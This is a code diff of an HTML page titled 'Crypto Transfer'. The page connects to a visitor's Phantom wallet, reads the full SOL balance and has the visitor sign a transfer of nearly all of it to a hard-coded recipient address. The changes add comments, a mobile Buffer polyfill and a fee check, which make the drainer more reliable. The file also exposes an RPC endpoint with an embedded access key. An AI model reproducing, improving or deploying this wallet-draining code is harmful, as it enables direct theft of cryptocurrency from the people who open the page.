@@ -4,40 +4,66 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.41.4/web3.min.js"></script>
+    
+    <!-- Solana Web3.js for Phantom Wallet -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+    <!-- Buffer Polyfill for Mobile Browsers -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
+    <script>
+        window.Buffer = window.Buffer || require('buffer').Buffer;
+    </script>
+
+    <link rel="icon" href="data:,">
 </head>
 <body>
-    <h1>Click below to transfer all funds</h1>
+    <h1>Click below to transfer all SOL</h1>
     <button id="transferButton">Transfer Now</button>
 
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
-            if (!window.solana) {
-                alert('Phantom wallet not found. Please install Phantom.');
+            // Check if Phantom wallet is installed
+            if (!window.solana || !window.solana.isPhantom) {
+                alert('Phantom Wallet not found. Please install Phantom.');
                 return;
             }
 
             try {
+                // Ensure Buffer is loaded for mobile devices
+                if (typeof Buffer === "undefined") {
+                    alert("Buffer is not defined. Please try again.");
+                    return;
+                }
+
+                // Connect to Phantom Wallet
                 await window.solana.connect();
                 const publicKey = window.solana.publicKey;
                 if (!publicKey) {
                     throw new Error('Failed to get public key.');
                 }
 
-                const connection = new solanaWeb3.Connection('https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df', 'confirmed');
+                // Connect to Solana RPC (QuickNode)
+                const connection = new solanaWeb3.Connection(
+                    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
+                    'confirmed'
+                );
+
+                // Get Wallet Balance
                 const balance = await connection.getBalance(publicKey);
-                
-                if (balance <= 0) {
+                if (balance <= 5000) { // Ensure enough balance to cover transaction fee
                     alert('Insufficient SOL balance.');
                     return;
                 }
 
-                const recipient = '9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf';
+                // Define the recipient wallet
+                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
+
+                // Create Transaction to Transfer SOL
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
-                        toPubkey: new solanaWeb3.PublicKey(recipient),
-                        lamports: balance - 5000 // Subtract estimated transaction fee
+                        toPubkey: recipient,
+                        lamports: balance - 5000 // Deduct transaction fee
                     })
                 );
 
@@ -45,11 +71,13 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
+                // Sign & Send the Transaction
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
                 await connection.confirmTransaction(signature);
 
-                alert(`Transaction successful: ${signature}`);
+                alert(`Transaction successful! Signature: ${signature}`);
             } catch (error) {
                 alert(`Transaction failed: ${error.message}`);
             }
